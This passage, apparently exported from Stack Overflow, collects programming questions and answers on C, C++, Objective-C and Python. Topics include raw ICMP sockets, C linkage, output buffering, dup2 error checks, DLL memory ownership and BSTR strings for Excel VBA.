<p>This is the code I currently have, but obviously doesn't work:</p>

<pre><code>s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
s.settimeout(3.0)
s.sendto(""Hello!"" + ""\r\n"", (server, 7))
msg = s.recvfrom(buff_size)
s.close()
</code></pre>

<p>I have to receive an answer from server if string ""Hello!"" is sent, but I don't get it.
I suppose, that ""Hello!"" string will be encapsulated into Data field:</p>

<p><img src=""http://i.stack.imgur.com/cmziS.png"" alt=""enter image description here""></p>
","9530","","<p>In order to construct an ICMP packet, you have to create the whole packet yourself using a raw socket.  The <a href=""http://docs.python.org/library/struct.html"" rel=""nofollow""><code>struct</code> module</a> is useful for this.</p>

<p>Secondly, in order to even use raw sockets in the first place, you need to have permission to do so—you should be running as root (I know this is a sufficient condition, but I'm not 100% certain that it's a necessary condition).  The <code>ping(1)</code> executable is able to do this because it's a <a href=""http://en.wikipedia.org/wiki/Setuid"" rel=""nofollow"">setuid</a> executable that runs as root when you run it.  Since scripts cannot be made setuid on Linux, you'll have to make a wrapper setuid program in C that just executes your Python script.</p>
"
"<p>I am working with a precompiled library (.lib) that I wrote in Visual Studio 2010.  My solution has two projects.  The first project (C) builds the library.  The second project (C++) is a Win32 console application that is intended to test the library.  Everything I've tried does not resolve the linker errors.  (I thought this would be easy because everything is in the same solution.)  Any pointers would be appreciated.  Thanks.</p>

<p>Here is the linker error that I am getting:</p>

<blockquote>
  <p>1>MyProject.obj : error LNK2019: unresolved external symbol ""void __cdecl my_function(void)"" (?my_function@@YAXXZ) referenced in function _wmain</p>
  
  <p>1>C:\Documents and Settings\user\Desktop\MySolution\Debug\MyProject.exe : fatal error LNK1120: 1 unresolved externals</p>
</blockquote>

<p>This is the code for the Win32 console application:</p>

<pre><code>#include ""stdafx.h""
#include ""my_api.h""

int _tmain(int argc, _TCHAR* argv[])
{
  my_function();

  return 0;
}
</code></pre>

<p>Here's how <code>my_function</code> is declared in <code>my_api.h</code>:</p>

<pre><code>extern VOID my_function(VOID);
</code></pre>
","9530","","<p>You need to <a href=""http://en.wikipedia.org/wiki/Compatibility_of_C_and_C%2B%2B#Linking_C_and_C.2B.2B_code"" rel=""nofollow"">declare your function with C linkage</a> in order for the linker to understand that those functions were defined in C code, not C++ code:</p>

<pre><code>// my_api.h
#ifdef __cplusplus
extern ""C"" {
#endif

extern VOID my_function(VOID);
// more function declarations etc.

#ifdef __cplusplus
}
#endif
</code></pre>

<p>If you only have one function, you can drop the braces:</p>

<pre><code>// my_api.h
#ifdef __cplusplus
extern ""C""
#endif
extern VOID my_function(VOID);
</code></pre>
"
"<p>so i am running this on bash:</p>

<pre><code># somedevice -getevent
</code></pre>

<p>What this command does is it just keeps running, and everytime my device sends a certain data, say it detects change in temperature, it outputs something like this</p>

<pre><code>/dev/xyz: 123 4567 8910112238 20
/dev/xyz: 123 4567 8915712347 19
/dev/xyz: 123 4567 8916412345 22
/dev/xyz: 123 4567 8910312342 25
/dev/xyz: 123 4567 8910112361 18
/dev/xyz: 123 4567 8910112343 20
</code></pre>

<p>And this just keeps running and as soon as it has any cause it outputs something. So there is no end to execution.</p>

<p>No the echo is working perfectly, however when i am trying to use the '>' operator this doesn't seem to write to file.</p>

<p>so for instance</p>

<pre><code>#somedevice -getevent &gt; my_record_file
</code></pre>

<p>this doesn't work properly, my_record_file only gets data written to it in <strong>intervals</strong>, however i want to be written immediately. </p>

<p>Any ideas?</p>
","9530","","<p>The output is being buffered because the C standard library changes the output buffering mode depending on whether or not stdout is a terminal device.  If it's a terminal device (according to <a href=""http://linux.die.net/man/3/isatty""><code>isatty(3)</code></a>), then stdout is <em>line-buffered</em>: it gets flushed every time a newline character gets written.  If it's not a terminal device, then it's <em>fully buffered</em>: it only gets flushed whenever a certain amount of data (usually something on the order of 4 KB to 64 KB) gets written.</p>

<p>So, when you redirect the command's output to a file using the shell's <code>&gt;</code> redirection operator, it's no longer outputting to a terminal and it buffers its output.  A program can change its buffering mode with <a href=""http://linux.die.net/man/3/setvbuf""><code>setvbuf(3)</code></a> and friends, but the program has to cooperate to do this.  Many programs have command line options to make them line-buffered, e.g. <code>grep(1)</code>'s <code>--line-buffered</code> option.  See if your command has a similar option.</p>

<p>If you don't have such an option, you can try using a tool such as <a href=""http://linux.die.net/man/1/unbuffer""><code>unbuffer(1)</code></a> to unbuffer the output stream, but it doesn't always work and isn't a standard utility, so it's not always available.</p>
"
"<p>I've this constructor of a Node class:</p>

<pre><code>Node::Node(int item,  Node const * next)
{
    this-&gt;item = item;
    this-&gt;next = next;
}
</code></pre>

<p>When I compile it gives a compile error: invalid conversion from 'const Node*' to 'Node*'</p>

<p>Is there a way to pass a pointer pointing to constant data?</p>
","9530","","<p>You're doing it correctly, but the compiler is right to complain: you're assigning a ""pointer to a const <code>Node</code>"" to a variable with a type of ""pointer to a non-const <code>Node</code>"".  If you later modify <code>this-&gt;next</code>, you're violating the contract of ""I will not modify the variable pointed to by <code>next</code>.</p>

<p>The easy fix is just to declare <code>next</code> as a pointer to non-const data.  If the variable <code>this-&gt;next</code> will truly never be modified for the life of the <code>Node</code> object, then you can alternatively declare the class member to be a pointer to a <code>const</code> object:</p>

<pre><code>class Node
{
    ...
    const Node *next;
}:
</code></pre>

<p>Also note the distinction between ""pointer to <code>const</code> data"" and ""<code>const</code> pointer to data"".  For single-level pointers, there are 4 types of pointers in regards to their <code>const</code>ness:</p>

<pre><code>Node *ptr;  // Non-constant pointer to non-constant data
Node *const ptr;  // Constant pointer to non-constant data
const Node *ptr;  // Non-constant pointer to constant data
Node const *ptr;  // Same as above
const Node *const ptr;  // Constant pointer to constant data
Node const *const ptr;  // Same as above
</code></pre>

<p>Note that <code>const Node</code> is the same as <code>Node const</code> at the last level, but the placement of <code>const</code> with regards to the pointer declaration (""<code>*</code>"") is very important.</p>
"
"<p>I would like to use pipes to redirect stdin and stdout of a child process.</p>

<p>At the moment I have the following code:</p>

<pre><code>void child(int pipeIn[], int pipeOut[]) {

    char buff[20];
    const char msg[]=""Child Message\n"";
    close(pipeIn[1]);
    close(pipeOut[0]);

    if (dup2(pipeIn[0], 0))
        perror(""dup2 pipeIn"");

    if (dup2(pipeOut[1], 1))
        perror(""dup2 pipeOut"");

    close(pipeIn[0]);
    close(pipeOut[1]);

    for (int i = 0; i &lt; 10; ++i) {
        read(0, buff, 20);
        fprintf(stderr, ""Child: %s\n"",buff);
        printf(""%s"",msg);
    }
}

void parent(int pipeIn[], int pipeOut[]) {

    char buff[20];

    const char msg[]=""Parent Message\n"";
    close(pipeIn[0]);
    close(pipeOut[1]);

    for (int i = 0; i &lt; 10; ++i) {
        write(pipeIn[1], msg, 16);
        read(pipeOut[0], buff, 50);
        printf(""Parent: %s"", buff);

    }

}

void test() {

    int pipeOut[2],pipeIn[2];

    if(pipe(pipeOut)) {
        perror(""pipeOut"");
        exit(1);
    }

    if(pipe(pipeIn)) {
        perror(""pipeIn"");
        exit(1);
    }

    int pid = fork();

    if (pid == -1) {
        perror(""fork()"");
        exit(1);
    } 
    else if (pid == 0) 
        child(pipeIn, pipeOut);
    else 
        parent(pipeIn,pipeOut);

}
</code></pre>

<p>This code, however, is not working because I keep getting </p>

<blockquote>
  <p>dup2 pipeOut: Undefined error: 0</p>
</blockquote>

<p>And it ends up in deadlock.<br>
I understand that the code halts because the parent keeps waiting for the answer of the child (that never arrives) and the same the child keeps waiting for an input that never arrives. </p>

<p>What I do not understand is why I keep getting that error. Am I doing something wrong? </p>

<p>I am working on MacOS Lion 10.7.2 and Xcode 4.2.1.</p>

<hr>

<p>UPDATE: after Adam Rosenfield's answer I corrected my if statement. However the code still halts as I said (I'm only able to read the first thing that the child prints <code>Child: Parent Message</code> and nothing else).</p>

<p>Any idea why this is happening?</p>
","9530","","<p><a href=""http://linux.die.net/man/3/dup2"" rel=""nofollow""><code>dup2(2)</code></a> returns a non-negative integer on success, namely the new file descriptor.  It returns -1 on error.  In your case, it's returning 0 on the first call because you're duplicating the pipe onto file descriptor 0.</p>

<p>To fix it, change your checks from <code>if(dup2(...))</code> to <code>if(dup2(...) == -1)</code>.</p>
"
"<p>I need to declare an integer in the size of 16 bit, in C.</p>

<p>I know that short and int sizes are machine dependent.</p>

<p>I tried to use <code>""stdint.h"",</code> but it seems that they simply do </p>

<pre><code>typedef short int16_t
</code></pre>

<p>So my question is: </p>

<p>Am I missing something and short type guarantees 16 bit length?</p>

<p>If no, is there is an alternative that guarantees it?</p>
","9530","","<p>No, <code>short</code> does <em>not</em> guarantee 16-bit length.  The only guarantees about the basic integer data types are:</p>

<ul>
<li><code>sizeof(char) &lt;= sizeof(short) &lt;= sizeof(int) &lt;= sizeof(long) &lt;= sizeof(long long)</code></li>
<li><code>sizeof(char) == 1</code> (note: a <code>char</code> could still be more than 8 bits!)</li>
<li><code>SHRT_MIN &lt;= -32767</code> and <code>SHRT_MAX &gt;= 32767</code> (implies <code>short</code> is at least 16 bits)</li>
<li><code>INT_MIN &lt;= -32767</code> and <code>INT_MAX &gt;= 32767</code> (implies <code>int</code> is at least 16 bits)</li>
<li><code>LONG_MIN &lt;= -2147483647</code> and <code>LONG_MAX &gt;= 2147483647</code> (implies <code>long</code> is at least 32 bits)</li>
<li><code>LLONG_MIN &lt;= -9223372036854775807</code> and <code>LLONG_MAX &gt;= 9223372036854775807</code> (implies <code>long long</code> is at least 64 bits)</li>
</ul>

<p>(C99 §5.2.4.2.1 and Annex E)</p>

<p>The fact that <code>short</code> is typedef'ed to <code>int16_t</code> on <em>your</em> machine just means that a <code>short</code> is 16 bits on <em>your</em> machine.  It does not mean that the definition will be the same on other people's machines (or even on other compiles on your same machine).</p>

<p>If you include <code>&lt;stdint.h&gt;</code>, it will define <code>int16_t</code> in some way which is guaranteed to be a type that is signed and 16 bits wide.  If you need exact-size integers, use those exact-size types.</p>
"
"<p>I am trying to create a C-style DLL interface that takes in an input char * and assigns an output char * after performing some translation operation. The return value of the function is an error code, so it won't be used to return a char *.</p>

<p>I call the function in this manner:</p>

<pre><code>char* output;
myfunc((char *) input.c_str(), &amp;output);
</code></pre>

<p>And the function is defined as:</p>

<pre><code>DLL_EXPORT int myfunc(char* input, char** output)
{
    string translation = translate(input);
    *output = (char *) malloc((translation.length()+1)*sizeof(char));
    strcpy(*output,(char *) translation.c_str());
}
</code></pre>

<p>Is this a correct way of implementing this? Am I creating a memory leak?</p>
","9530","","<p>It's correct, but you also need to provide another DLL function that will free the memory.  You cannot assume that the executable which has loaded your DLL is using the same version of the C runtime library, so if it tries to call <code>free</code> on the returned memory, you might end up corrupting your heap due to differences in the <code>malloc</code>/<code>free</code> implementations in the different runtimes.</p>

<p>Your API should look something like this:</p>

<pre><code>DLL_EXPORT int myfunc(char* input, char** output)
{
    ...
    *output = malloc(...);
    ...
}

DLL_EXPORT void myfunc_free(char *output)
{
    free(output);
}
</code></pre>

<p>See also <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2006/09/15/755966.aspx"" rel=""nofollow"">allocating and freeing memory across module boundaries</a>.</p>
"
"<p>I'm doing a small app for evaluating and analyzing transfer functions. As boring as the subject might seem to some, I want it to at least look extra cool and pro and awesome etc... So:</p>

<ul>
<li>Step 1: Gimme teh coefficients! [A bunch of numbers]</li>
<li>Step 2: I'll write the polynomial with its superscripts. [The bunch of numbers in a string]</li>
</ul>

<p>So, I write a little C parser to just print the polynomial with a decent format, for that I require a <code>wchar_t</code> string that I concatenate on the fly. After the string is complete I quickly try printing it on the console to check everything is ok and keep going. Easy right? Welp, I ain't that lucky...</p>

<pre><code>wchar_t *polynomial_description( double *polyArray, char size, char var ){

    wchar_t *descriptionString, temp[100];
    int len, counter = 0;
    SUPERSCRIPT superscript;

    descriptionString = (wchar_t *) malloc(sizeof(wchar_t) * 2);
    descriptionString[0] = '\0';

    while( counter &lt; size ){

        superscript = polynomial_utilities_superscript( size - counter );
        len = swprintf(temp, 100, L""%2.2f%c%c +"", polyArray[counter], var, superscript);
        printf(""temp size: %d\n"", len);

        descriptionString = (wchar_t *) realloc(descriptionString, sizeof(wchar_t) * (wcslen(descriptionString) + len + 1) );
        wcscat(descriptionString, temp);

        counter++;

    }

    //fflush(stdout); //Already tried this
    len = wprintf(L""%ls\n"", descriptionString);
    len = printf(""%ls**\n"", descriptionString);
    len = fprintf(stdout, ""%ls*\n"", descriptionString);
    len = printf(""FFS!! Print something!"");

    return descriptionString;

}
</code></pre>

<p>During the run we can see <code>temp size: 8</code> printed the expected number of times ONLY WHILE DEBUGGING, if I run the program I get an arbitrary number of prints each run. But after that, as the title states, wprintf, printf and fprintf don't print anything, yet <code>len</code> does change its size after each call.</p>

<p>In the caller function, (<code>application:(UIApplication *)application didFinishLaunchingWithOptions:</code>, while testing) I put an NSLog to print the return string, and I dont get ANYTHING not even the Log part.</p>

<p>What's happening? I'm at a complete loss.</p>

<p>Im on XCode 4.2 by the way.</p>
","9530","","<p>What's the return value from <code>printf</code>/<code>wprintf</code> in the case where you think it's not printing anything?  It <em>should</em> be returning either -1 in the case of a failure or 1 or more, since if successful, it should always print at least the newline character after the description string.</p>

<ul>
<li>If it's returning 1 or more, is the newline getting printed?  Have you tried piping the output of your program to a hex dumper such as <a href=""http://linux.die.net/man/1/hexdump"" rel=""nofollow""><code>hexdump -C</code></a> or <a href=""http://developer.apple.com/library/mac/#documentation/Darwin/Reference/ManPages/man1/xxd.1.html"" rel=""nofollow""><code>xxd(1)</code></a>?</li>
<li>If it's returning -1, what is the value of <code>errno</code>?</li>
</ul>

<p>If it turns out that <code>printf</code> is failing with the error <code>EILSEQ</code>, then what's quite likely happening is that your string contains some non-ASCII characters in it, since those cause <a href=""http://developer.apple.com/library/mac/#documentation/darwin/reference/manpages/man3/mbstowcs.3.html"" rel=""nofollow""><code>wcstombs(3)</code></a> to fail in the default C locale.  In that case, the solution is to use <a href=""http://developer.apple.com/library/ios/#DOCUMENTATION/System/Conceptual/ManPages_iPhoneOS/man3/setlocale.3.html"" rel=""nofollow""><code>setlocale(3)</code></a> to switch into a UTF-8 locale when your program starts up:</p>

<pre><code>int main(int argc, char **argv)
{
    // Run ""locale -a"" in the Terminal to get a list of all valid locales
    setlocale(LC_ALL, ""en_US.UTF-8"");
    ...
}
</code></pre>
"
"<p>I'm currently writing a C dynamic library in MacOSX, the functions are then used in Excel (2011) using the VBA, e.g.:</p>

<pre><code>Declare Function TestF Lib ""path_to_lib:mylib.dylib"" Alias ""test"" (ByRef res As String) As String
</code></pre>

<p>This works fine for functions that return integers etc., but I can't figure out how to pass strings back to VBA. My C function looks like this:</p>

<pre><code>char* test(char *res)
{
  res = ""test"";
  return res;
}
</code></pre>

<p>but calling the function TestF in VBA as</p>

<pre><code>Dim res As String
res = TestF(res)
</code></pre>

<p>crashes Excel...
If I use a function that is provided by the MathLink (Mathematica) library, e.g.</p>

<pre><code>#include ""mathlink.h""
char* test(MLINK link, char *res)
{
  MLGetString(link, &amp;res);
  return res;
}
</code></pre>

<p>this function successfully assigns a string to ""res"" that I can use in VBA. The information on MLGetString can be found here: <a href=""http://reference.wolfram.com/mathematica/ref/c/MLGetString.html"" rel=""nofollow"">http://reference.wolfram.com/mathematica/ref/c/MLGetString.html</a>.</p>

<p>So apparently, this function is able to create a string and pass it to <code>res</code> and I can use the string in VBA then. So any ideas how this function does that, or how I could pass a string to VBA without having to use OLE etc.? </p>
","9530","","<p><a href=""http://msdn.microsoft.com/en-us/library/ms811463.aspx"" rel=""nofollow"">Strings in Visual Basic</a> are represented using <code>BSTR</code> objects: they consist of a pointer to a null-terminated wide-character string (UTF-16) <em>which is preceded by a 4-byte length prefix</em>.  For example, here's what the 4-character string ""test"" looks like in memory on a little-endian machine:</p>

<pre><code>+-------------+-------+-------+-------+-------+-------+
| 08 00 00 00 | 74 00 | 65 00 | 73 00 | 74 00 | 00 00 |
+-------------+-------+-------+-------+-------+-------+
 Length:        't'     'e'     's'     't'     '\0'
 8 bytes
 (not including null)
</code></pre>

<p>Most importantly, the <code>BSTR</code> pointer itself points to the <em>start of the string</em> (the first <code>74</code> byte in this example), <strong>not</strong> the length prefix.</p>

<p>For reading <code>BSTR</code>s, you can just treat them as regular pointers to wide-character strings, and you'll be all right for the most part.  But if you need to write/create them, it's a little trickier.</p>

<p>When creating <code>BSTR</code>s, you normally allocate them using <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms221458%28v=vs.85%29.aspx"" rel=""nofollow""><code>SysAllocString</code></a> (and its relatives) and deallocate them using <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms221481%28v=vs.85%29.aspx"" rel=""nofollow""><code>SysFreeString</code></a>.  You need to figure out how Excel on OS X exposes those functions (likely through the OLE dynamic library), since they're not standard C.  If you try to return a string that wasn't allocated through <code>SysAllocString</code>, then Excel is going to try to free it using <code>SysFreeString</code>, which will likely corrupt your heap and crash your program.  So don't do that.</p>

<p>Also note that by default, a <code>wchar_t</code> has a size of 4 bytes, not 2, on OS X, so you can't use the <code>wchar_t</code> data type when dealing with <code>BSTR</code>s—you need to use an explicit 16-bit data type (such as <code>uint16_t</code>), or compile with the <code>-fshort-wchar</code> compiler option to force <code>wchar_t</code> to be 2 bytes, but be aware of the binary incompatibility issues that that may cause.</p>
"
"<p>I have a (C, Linux) application which handles Ctrl-C SIGINT by shutting down.
I'd like to add another signal handler so that I can use another keystroke combo for ""reload configuration while running"".</p>

<p>So I'm looking from a signal I can send to the foreground process by keystroke, which doesn't force the process to quit or suspend. Are there any others?</p>
","9530","","<p>Your program can use <a href=""http://en.wikipedia.org/wiki/SIGUSR1_and_SIGUSR2"" rel=""nofollow""><code>SIGUSR1</code> and <code>SIGUSR2</code></a> to do whatever it wants, but there's no single-stroke way of sending them like how a Ctrl+C sends a <code>SIGINT</code> signal.  You have to use something like <a href=""http://linux.die.net/man/1/kill"" rel=""nofollow""><code>kill(1)</code></a> to send the signal, e.g. <code>kill -USR1 &lt;mypid&gt;</code>.</p>
"
"<p>i am interested, how optimal way is calculate number of bits set in byte by this way</p>

<pre><code>template&lt; unsigned char byte &gt; class BITS_SET
{
public:
    enum {
     B0 = (byte &amp; 0x01) ? 1:0,
     B1 = (byte &amp; 0x02) ? 1:0,
     B2 = (byte &amp; 0x04) ? 1:0,
     B3 = (byte &amp; 0x08) ? 1:0,
     B4 = (byte &amp; 0x10) ? 1:0,
     B5 = (byte &amp; 0x20) ? 1:0,
     B6 = (byte &amp; 0x40) ? 1:0,
     B7 = (byte &amp; 0x80) ? 1:0
    };
public:
 enum{RESULT = B0+B1+B2+B3+B4+B5+B6+B7};
};
</code></pre>

<p>maybe it is optimal when value of byte is known at run-time yes?is it recomended use  this in code?</p>
","9530","","<p>For 8-bit values, just use a 256-element lookup table.</p>

<p>For larger sized inputs, it's slightly less trivial.  Sean Eron Anderson has several different functions for this on his <a href=""http://graphics.stanford.edu/~seander/bithacks.html#CountBitsSetNaive"">Bit Twiddling Hacks page</a>, all with different performance characteristics.  There is not one be-all-end-all-fastest version, since it depends on the nature of your processor (pipeline depth, branch predictor, cache size, etc.) and the data you're using.</p>
"
"<p>The following line of code causes my program to break in a very strange way...</p>

<pre><code>id foo = (id)0xbfffe8d0;
</code></pre>

<p>Yet, this is no problem:</p>

<pre><code>int foo = (int)(id)0xbfffe8d0;
</code></pre>

<p>And even this is no problem:</p>

<pre><code>int magicAddr = 0xbfffe8d0;
id foo = (id)magicAddr;
</code></pre>

<p>W. T. F. ?</p>

<p><strike>
Just inserting that line of code inside a particular init method causes my iteration through an array to fail with ""NSGenericException: Collection was mutated while being enumerated"".  Commenting the line out causes the exception not to happen.  This code is single-threaded.  The behavior is deterministic and has consistently reproduced over and over again and consistently non-reproduced when I comment the line out.  ""foo"" is a made-up variable and is never referenced again.  No other code refers to ""foo"".</p>

<p>Does that line have a side-effect?  Does casting a number to an (id) have some side-effect?</p>

<p>More details on what I was doing:</p>

<ul>
<li>I ran NSLog(@""self=%p, super=%p"", self, super) and it printed out ""self=0xa83dc50, super=0xbfffe8d0"", leading me to ask <a href=""http://stackoverflow.com/questions/9961527/what-is-super-in-objective-c-self-super"">this question</a></li>
<li>I have _NO_IDEA_ what that 0xbfffe8d0 value is or means.</li>
<li>The line I pasted is inside a method init2 for a class that has a reference to the NSEnumerator over the collection which throws the Exception.  The class does NOT mutate the collection or even have a reference to the collection.</li>
</ul>

<p>The exact code: (removed, not relevant or interesting)</strike></p>

<hr>

<p>OK, so I still can't explain the behavior above.  I can't explain why a 4-byte int on the stack is ok, but a 4-byte ""id"" is crashville.  But I ran this code a few hundred times putting all manor of random crap in, and I was able to trigger crashes with other values and statements.  Always deterministic, but no clear or explainable pattern for stuff that crashed vs stuff that didn't.  Bizzare stuff, but not the ultimate issue.</p>

<p><strong>The real issue?</strong>  The collection was from [NSThread callStackSymbols].  That returns _NSCallStackArray.  That's where the real Zebra lives.  There's something funky about that pseudo-collection, but I couldn't tell you what exactly.</p>

<p><strong>The fix?</strong></p>

<pre><code>[NSArray arrayWithArray: [NSThread callStackSymbols]]
</code></pre>

<p>With the fix, no combination of random crap in my code will trigger the enumeration crash.  So beware.  If you plan to return the call stack symbols and treat them as an array, MAKE A COPY.</p>

<p><strong>The lesson?</strong> If you call [NSThread callStackSymbols] and want to treat the result like an array, MAKE A COPY and get a real array.  Else, .... ""there be dragons"" !!</p>
","9530","","<p>No.  <code>id</code> is a <code>typedef</code> for a pointer type, and assigning to a pointer has no side effects.  You have some other bug in your code somewhere else, it's impossible to say without seeing more code.</p>

<p><code>0xbfffe8d0</code> is a pointer to an address in your stack.  When compiled without optimizations, the assignment does write the value <code>0xbffe8d0</code> into your stack, but that value then never gets read anywhere.  So it does have the effect of (a) increasing that function's stack frame size by 4 bytes and (b) changing the size of the function's code and offsetting all of the subsequent code.  Most likely these changes are causing the bug elsewhere in your program to appear or not appear.</p>
"
"<p>After compiling/linking some .c .cpp and .h files, there are a couple of extra .h~ files show up. They seem to have the exact content of the original .h files, when I peek at them using cat.
BTW, the OS is ubuntu</p>
","9530","","<p>The are backup files produced by text editors, notably emacs and gedit, among others.  See <a href=""http://stackoverflow.com/questions/151945/how-do-i-control-how-emacs-makes-backup-files"">How do I control how emacs makes backup files?</a> for tips on controlling that.</p>
"
"<p>I would like to create a program that will run in background as a final product. For debug purpose I want it to display a console.</p>

<p>I learned that there is a <strong>ShowWindow( hWnd, SW_HIDE );</strong> function, but if I use it in a 'standard' main function the console window still pops up for a moment. I was trying to work it out like this (yes I know it's crappy):</p>

<pre><code>#define _WIN32_WINNT 0x0500
#include &lt;windows.h&gt;
#include &lt;iostream&gt;
#include &lt;stdio.h&gt;
#include &lt;tchar.h&gt;


#define DEBUG
//#undef DEBUG

#ifndef DEBUG
#pragma comment(linker, ""/SUBSYSTEM:WINDOWS"")

int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
    HWND hWnd = GetConsoleWindow();
    ShowWindow( hWnd, SW_HIDE );    

    while(1);

    return 0;
}
#else
#pragma comment(linker, ""/SUBSYSTEM:CONSOLE"")
    int main(int argc, int **argv)
    {
        HWND hWnd = GetConsoleWindow();

        while(1);

        return 0;
    }
#endif
</code></pre>

<p>Here I managed to prevent the window form popping up, but I can't pass parameters to the program.</p>

<p>I believe there is a much better solution for this. Can you share?</p>

<p>PS</p>

<p>I don't want to use .NET.</p>
","9530","","<p>You can still pass parameters to a regular, non-console Win32 program: they just show up in the single <code>lpCmdLine</code> string, all globbed together into one big command line.  You can use <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/bb776391%28v=vs.85%29.aspx"" rel=""nofollow""><code>CommandLineToArgvW</code></a> to parse that into separate arguments, but do note that that function is only available in the Unicode flavor.  For example:</p>

<pre><code>int wmain(int argc, wchar_t **argv)
{
    // Common main function (Unicode args)
}

#ifndef DEBUG
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
    // Forward invocation to wmain
    int argc;
    LPWSTR *argv = CommandLineToArgvW(pCmdLine, &amp;argc);
    int status = wmain(argc, argv);
    LocalFree(argv);
    return status;
}
#endif
</code></pre>

<p>I'd also recommend using your project settings to set the executable's subsystem (console or Windows) depending on the configuration instead of using a <code>#pragma</code> to do it.</p>
"
"<p>Right now I'm doing as follow:</p>

<pre><code>uint8_t ManualFlow = 40; // 0 -&gt; 255     Unsigned Char

uint24_t ME; // 0 -&gt; 16777215 Unsigned Short Long
ME = (uint24_t) ManualFlow*10; // Have to make this hack otherwise malfunction in calculation
ME /= 6;
ME *= (80 - 60);
ME /= 100;
ME *= 414;
</code></pre>

<p>The end result: </p>

<pre><code>40*10 = 400
400/6 = 66
66*20 = 1320
1320/100 = 13
13*414 = 5382
</code></pre>

<p>What I would Love is similar to this:</p>

<pre><code>4/60 = 0,0667 * 20 * 4188 * 0,998 = 5576 (more accurate).
</code></pre>

<p>How can I do this more accurate without using <code>float</code>s or <code>double</code>s, and most important
not increase my code size too much.</p>

<p>Kind Regards
Sonite</p>
","9530","","<p>If you're certain that the result will never overflow, do all of your multiplication before the divisions:</p>

<pre><code>uint24_t ME;
ME = (uint24_t)ManualFlow*10;
ME *= (80 - 60);
ME *= 414;
ME /= (6 * 14);
</code></pre>

<p>If you need more than integer accuracy but want to avoid floating-point, consider using <a href=""http://en.wikipedia.org/wiki/Fixed-point_arithmetic"" rel=""nofollow"">fixed-point arithmetic</a> instead.</p>
"
"<p>okay, this is about to get a little complicated so i'll just start with an example.</p>

<pre><code>class a
{
public:
     a()
     {
          pointerMap.insert( pair&lt;std::string, void a::*(int, int)&gt; (""func1"", func1);
          pointerMap.insert(pair&lt;std::string, void a::*(int, int)&gt; (""func2"", func2);
     }

private:
     void func1(int a, int b);
     void func2(int a, int b);
     map&lt;std::string, void a::* (int, int)&gt; pointerMap;
}
</code></pre>

<p>my question is, is this the right way to go about adding pointers to member functions to a map within an object, so that you are only referencing the individual instance's func1 or func2.</p>

<p>And also, i have no clue how i would go about calling this function from the pointer. would it be something like this?</p>

<pre><code>map[""func1""](2,4);
</code></pre>

<p>i'm a little confused as to what syntax is different when working with member functions.</p>
","9530","","<p>That's the correct way of inserting the pointers into the map, but you can tidy things up a little by using <code>make_pair</code>, which deduces the template arguments for you:</p>

<pre><code>pointerMap.insert(std::make_pair(""func1"", &amp;func1));  // The '&amp;' is optional
</code></pre>

<p>To call a function, you need to use the <code>.*</code> or <code>-&gt;*</code> operator, depending on whether the object you're calling it on is being referenced through a pointer or not:</p>

<pre><code>a obj;  // Regular object
(a .* map[""func1"")(2, 4);  // Extra parens needed due to operator precedence

a *ptr;  // Pointer
(a -&gt;* map[""func1"")(2, 4);
</code></pre>

<p>Some people like to define a macro to make it more obvious what you're doing, since the syntax can be a little confusing to some:</p>

<pre><code>#define CALL_MEMBER_FUN_PTR(obj, fun) ((obj) -&gt;* (fun))
...
a *ptr;
CALL_MEMBER_FUN_PTR(ptr, map[""func1""])(2, 4);
</code></pre>
"
"<p>I am writing a simple sender and receiver program to transit using UDP so it's connectionless, but I am having a problem figuring out whether my receiver program needs to call bind() or the server and/or both. My receiver program(client) will sit in an infinite loop waiting to receive data from the sender(server) and then it will print out the data. I'm not quite sure what bind() does exactly besides associating an address/port with a specific socket. Why is it that I need to call bind()?</p>
","9530","","<p>You need to call <a href=""http://linux.die.net/man/2/bind"" rel=""nofollow""><code>bind(2)</code></a> so that the OS knows which application to route network packets to.  When you call <code>bind</code> with a specific port for a given protocol (e.g. TCP or UDP), you're asking it ""whenever you see a network packet on port XXXXX, please give it to me"".</p>

<p>Say, for example, that two copies of your program were running, and they both wanted to listen for UDP packets on the same port.  If they both call <code>bind</code> on the same port, then one will succeed and one will fail, since the OS can arbitrate who is bound to each port.  Then, any packet received on that port will be given to whichever instance of the program succeeded at binding to that port.</p>
"
"<p>I'm verifying my app and I got a lot of this kind of warnings:</p>

<p>Object with a +0 retain count returned to caller where a +1 (owning) retain count is expected</p>

<p>This is an example of one of those methods that generate the warning (the warning is on the return line)</p>

<pre><code>+ (vehicleInfo*) newWithNode: (CXMLNode*) node
{
    if(node == nil) { return nil; }
    return (vehicleInfo*)[[[vehicleInfo alloc] initWithNode: node] autorelease];
}
</code></pre>

<p>Is it something I should worry about?
How can I fix it?</p>

<p>Thanks in advance,
Samuel</p>
","9530","","<p>You're getting the warning because you're violating the contract that you become an owner of objects created with a method named with <code>new</code>.  Any code calling <code>+newWithNode</code> expects to be an owner of the return value and should later call <code>-release</code> to release it.</p>

<p>See the <a href=""http://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/MemoryMgmt/Articles/mmRules.html#//apple_ref/doc/uid/20000994-BAJHFBGH"" rel=""nofollow"">Objective-C Memory Management Policy</a> for more details.</p>
"
"<p>Using the ctypes module I can easily import a POINTER(c_char) or a c_char_p type into python, but neither of these provides a way to end up with a python string that contains zero value bytes.</p>

<p>c_char_p is zero terminated, meaning that a char * array from C is terminated at the first zero value.</p>

<p>POINTER(c_char) is the recommended way of importing binary data that can have 0 values, but there doesn't seem to be a way to directly convert this into a python string.</p>

<p>I can do this:</p>

<pre><code>pixels = clibblah.get_pixels()
a = """"
for i in range(0, clibblah.get_pixel_length()):
    a += pixels[i]
</code></pre>

<p>...but this 1) doesn't seem very pythony, and 2) takes forever (converting a 640x480 block of pixel data takes about 2 seconds on my mac).</p>

<p>I've seen a bunch of questions regarding this on stack overflow, but darned if I can see one that isn't either people going ""why do you need to do that?"" or ""c_char_p will do what you want"" (it doesn't, as I've described above).</p>

<p>The only credible advice I've seen is to use the c api PyString_FromStringAndSize, as recommended here:
